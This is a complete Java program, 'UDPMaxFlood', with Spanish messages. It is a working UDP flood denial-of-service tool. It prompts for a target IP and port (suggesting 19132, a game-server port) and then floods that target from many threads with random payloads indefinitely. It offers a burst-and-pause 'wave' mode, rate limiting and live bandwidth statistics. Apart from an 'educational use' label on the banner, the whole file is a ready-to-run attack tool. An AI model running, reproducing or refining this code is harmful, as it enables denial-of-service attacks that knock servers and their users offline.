import java.net.*;
import java.util.Random;
import java.util.concurrent.atomic.AtomicLong;
import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class UDPMaxFlood {
    private static AtomicLong packetCount = new AtomicLong(0);
    private static volatile boolean running = true;
    private static long startTime = 0;
    private static int packetSize = 0;
    private static boolean waveMode = false;
    private static int waveDuration = 5;
    private static int waveInterval = 2;
    private static int packetsPerSecond = 0; // 0 = máximo rendimiento
    
    public static void main(String[] args) {
        if (args.length >= 3) {
            // Modo línea de comandos
            try {
                String targetIP = args[0];
                int targetPort = Integer.parseInt(args[1]);
                packetSize = Integer.parseInt(args[2]);
                int threadCount = args.length >= 4 ? Integer.parseInt(args[3]) : Runtime.getRuntime().availableProcessors() * 2;
                
                // Parámetros opcionales
                boolean useWaveMode = false;
                int customWaveDuration = 5;
                int customWaveInterval = 2;
                int customPPS = 0;
                
                for (int i = 4; i < args.length; i++) {
                    if (args[i].equals("-wave")) {
                        useWaveMode = true;
                    } else if (args[i].equals("-wavedur") && i + 1 < args.length) {
                        customWaveDuration = Integer.parseInt(args[++i]);
                    } else if (args[i].equals("-waveint") && i + 1 < args.length) {
                        customWaveInterval = Integer.parseInt(args[++i]);
                    } else if (args[i].equals("-pps") && i + 1 < args.length) {
                        customPPS = Integer.parseInt(args[++i]);
                    }
                }
                
                // Validaciones básicas
                if (packetSize < 1 || packetSize > 65500) {
                    System.out.println("Error: Tamaño de paquete inválido (1-65500 bytes)");
                    return;
                }
                
                if (customWaveDuration < 1 || customWaveDuration > 10) {
                    System.out.println("Error: Duración de oleaje inválida (1-10 segundos)");
                    return;
                }
                
                if (customWaveInterval < 1 || customWaveInterval > 10) {
                    System.out.println("Error: Intervalo de oleaje inválido (1-10 segundos)");
                    return;
                }
                
                System.out.println("[!] Iniciando ataque UDP infinito...");
                System.out.println("   Target: " + targetIP + ":" + targetPort);
                System.out.println("   Hilos: " + threadCount);
                System.out.println("   Tamaño de paquete: " + packetSize + " bytes");
                System.out.println("   Paquetes/segundo: " + (customPPS > 0 ? customPPS : "Máximo"));
                System.out.println("   Modo oleaje: " + (useWaveMode ? "Activado (" + customWaveDuration + "s/" + customWaveInterval + "s)" : "Desactivado"));
                System.out.println("   Use Ctrl+C para detener el ataque");
                
                waveMode = useWaveMode;
                waveDuration = customWaveDuration;
                waveInterval = customWaveInterval;
                packetsPerSecond = customPPS;
                startAttack(targetIP, targetPort, threadCount);
                
            } catch (Exception e) {
                System.out.println("Error en parámetros: " + e.getMessage());
                System.out.println("Uso: java UDPMaxFlood <IP> <puerto> <tamaño> [hilos] [-wave] [-wavedur segundos] [-waveint segundos] [-pps paquetes_por_segundo]");
            }
        } else {
            // Modo interactivo
            showBanner();
            interactiveMode();
        }
    }
    
    private static void showBanner() {
        System.out.println("\u001B[31m");
        System.out.println("███████╗██╗      ██████╗  ██████╗ ██████╗ ");
        System.out.println("██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗");
        System.out.println("█████╗  ██║     ██║   ██║██║   ██║██║  ██║");
        System.out.println("██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║");
        System.out.println("██╗     ███████╗╚██████╔╝╚██████╔╝██████╔╝");
        System.out.println("╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ");
        System.out.println("\u001B[33m");
        System.out.println("       HERRAMIENTA UDP FLOOD (JAVA)");
        System.out.println("\u001B[36m       Para uso educativo\u001B[0m\n");
    }
    
    private static void interactiveMode() {
        try {
            Scanner scanner = new Scanner(System.in);
            
            System.out.print("[?] Ingresa la IP objetivo: ");
            String targetIP = scanner.nextLine();
            
            System.out.print("[?] Ingresa el puerto objetivo (ej: 19132): ");
            int targetPort = Integer.parseInt(scanner.nextLine());
            
            System.out.print("[?] Tamaño de paquete (1-65500 bytes): ");
            packetSize = Integer.parseInt(scanner.nextLine());
            
            System.out.print("[?] Número de hilos (recomendado: " + 
                           Runtime.getRuntime().availableProcessors() * 2 + "): ");
            int threadCount = Integer.parseInt(scanner.nextLine());
            
            System.out.print("[?] Límite de paquetes/segundo (0 = máximo): ");
            packetsPerSecond = Integer.parseInt(scanner.nextLine());
            
            System.out.print("[?] ¿Activar modo oleaje/montaña rusa? (s/n): ");
            String waveResponse = scanner.nextLine();
            
            if (waveResponse.equalsIgnoreCase("s") || waveResponse.equalsIgnoreCase("si")) {
                waveMode = true;
                
                System.out.print("[?] Duración de cada oleada (1-10 segundos): ");
                waveDuration = Integer.parseInt(scanner.nextLine());
                
                System.out.print("[?] Intervalo entre oleadas (1-10 segundos): ");
                waveInterval = Integer.parseInt(scanner.nextLine());
                
                // Validar los valores de oleaje
                if (waveDuration < 1 || waveDuration > 10) {
                    System.out.println("Error: Duración de oleaje debe estar entre 1 y 10 segundos");
                    return;
                }
                
                if (waveInterval < 1 || waveInterval > 10) {
                    System.out.println("Error: Intervalo de oleaje debe estar entre 1 y 10 segundos");
                    return;
                }
            }
            
            // Validaciones
            if (packetSize < 1 || packetSize > 65500) {
                System.out.println("Error: Tamaño de paquete inválido");
                return;
            }
            
            System.out.println("\n[!] Configuración del ataque:");
            System.out.println("   Target: " + targetIP + ":" + targetPort);
            System.out.println("   Hilos: " + threadCount);
            System.out.println("   Tamaño de paquete: " + packetSize + " bytes");
            System.out.println("   Paquetes/segundo: " + (packetsPerSecond > 0 ? packetsPerSecond : "Máximo"));
            System.out.println("   Modo oleaje: " + (waveMode ? "Activado (" + waveDuration + "s/" + waveInterval + "s)" : "Desactivado"));
            System.out.println("   Duración: Infinita (Ctrl+C para detener)");
            
            System.out.print("\n[!] ¿Iniciar ataque? (s/n): ");
            String confirm = scanner.nextLine();
            
            if (!confirm.equalsIgnoreCase("s") && !confirm.equalsIgnoreCase("si")) {
                System.out.println("Ataque cancelado");
                return;
            }
            
            startAttack(targetIP, targetPort, threadCount);
            scanner.close();
            
        } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }
    }
    
    private static void startAttack(String targetIP, int targetPort, int threadCount) {
        try {
            System.out.println("\n[!] Iniciando ataque UDP infinito... Ctrl+C para detener");
            
            // Iniciar estadísticas
            startTime = System.currentTimeMillis();
            Thread statsThread = new Thread(UDPMaxFlood::showStats);
            statsThread.setDaemon(true);
            statsThread.start();
            
            // Crear pool de hilos
            ExecutorService executor = Executors.newFixedThreadPool(threadCount);
            for (int i = 0; i < threadCount; i++) {
                executor.execute(new FloodWorker(targetIP, targetPort, i));
            }
            
            executor.shutdown();
            
            // Esperar indefinidamente (hasta Ctrl+C)
            executor.awaitTermination(Long.MAX_VALUE, TimeUnit.SECONDS);
            
        } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }
    }
    
    static class FloodWorker implements Runnable {
        private final String targetIP;
        private final int targetPort;
        private final int threadId;
        private final Random random = new Random();
        
        public FloodWorker(String targetIP, int targetPort, int threadId) {
            this.targetIP = targetIP;
            this.targetPort = targetPort;
            this.threadId = threadId;
        }
        
        @Override
        public void run() {
            try {
                DatagramSocket socket = new DatagramSocket();
                socket.setSendBufferSize(1024 * 1024);
                InetAddress address = InetAddress.getByName(targetIP);
                
                // Crear payload aleatorio
                byte[] payload = new byte[packetSize];
                random.nextBytes(payload);
                
                DatagramPacket packet = new DatagramPacket(
                    payload, payload.length, address, targetPort
                );
                
                // Variables para el modo oleaje
                long lastWaveChange = System.currentTimeMillis();
                boolean inWave = true;
                
                // Variables para control de tasa de paquetes
                long lastBatchTime = System.currentTimeMillis();
                int packetsSentInBatch = 0;
                
                // Bucle de ataque infinito
                while (running) {
                    // Modo oleaje: alternar entre envío rápido y pausas
                    if (waveMode) {
                        long currentTime = System.currentTimeMillis();
                        long elapsed = (currentTime - lastWaveChange) / 1000;
                        
                        if (inWave && elapsed >= waveDuration) {
                            // Cambiar a intervalo de pausa
                            inWave = false;
                            lastWaveChange = currentTime;
                            System.out.println("\n[OLEAJE] Pausa por " + waveInterval + " segundos");
                        } else if (!inWave && elapsed >= waveInterval) {
                            // Cambiar a oleada activa
                            inWave = true;
                            lastWaveChange = currentTime;
                            packetsSentInBatch = 0;
                            lastBatchTime = currentTime;
                            System.out.println("\n[OLEAJE] Oleada activa por " + waveDuration + " segundos");
                        }
                        
                        // Si estamos en pausa, esperar
                        if (!inWave) {
                            try { Thread.sleep(100); } catch (InterruptedException ie) {}
                            continue;
                        }
                    }
                    
                    try {
                        // Controlar tasa de paquetes por segundo si está configurado
                        if (packetsPerSecond > 0) {
                            long currentTime = System.currentTimeMillis();
                            long timeSinceLastBatch = currentTime - lastBatchTime;
                            
                            if (timeSinceLastBatch >= 1000) {
                                // Reiniciar contador cada segundo
                                packetsSentInBatch = 0;
                                lastBatchTime = currentTime;
                            }
                            
                            if (packetsSentInBatch < packetsPerSecond) {
                                socket.send(packet);
                                packetsSentInBatch++;
                                packetCount.incrementAndGet();
                            } else {
                                // Esperar hasta el próximo intervalo de tiempo
                                try { Thread.sleep(1); } catch (InterruptedException ie) {}
                                continue;
                            }
                        } else {
                            // Envío a máxima velocidad
                            socket.send(packet);
                            packetCount.incrementAndGet();
                        }
                    } catch (Exception e) {
                        System.out.println("Error en hilo " + threadId + ": " + e.getMessage());
                        try { Thread.sleep(10); } catch (InterruptedException ie) {}
                    }
                }
                
                socket.close();
                
            } catch (Exception e) {
                System.out.println("Error en hilo " + threadId + ": " + e.getMessage());
            }
        }
    }
    
    private static void showStats() {
        while (running) {
            try {
                Thread.sleep(2000);
                
                long elapsed = (System.currentTimeMillis() - startTime) / 1000;
                if (elapsed > 0) {
                    long count = packetCount.get();
                    double pps = (double) count / elapsed;
                    double mbps = (count * packetSize * 8) / (elapsed * 1000000.0);
                    
                    String waveInfo = "";
                    if (waveMode) {
                        waveInfo = " | Modo: OLEAJE";
                    }
                    
                    String ppsInfo = "";
                    if (packetsPerSecond > 0) {
                        ppsInfo = " | Límite: " + packetsPerSecond + " pps";
                    }
                    
                    System.out.printf("\r[ESTADÍSTICAS] Paquetes: %,d | PPS: %,.0f | Ancho de banda: %.2f Mbps%s%s", 
                                     count, pps, mbps, ppsInfo, waveInfo);
                }
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
    }
    
    // Manejar Ctrl+C
    static {
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            running = false;
            System.out.println("\n\n[!] Deteniendo ataque...");
            System.out.println("[!] Total de paquetes enviados: " + packetCount.get());
        }));
    }
}
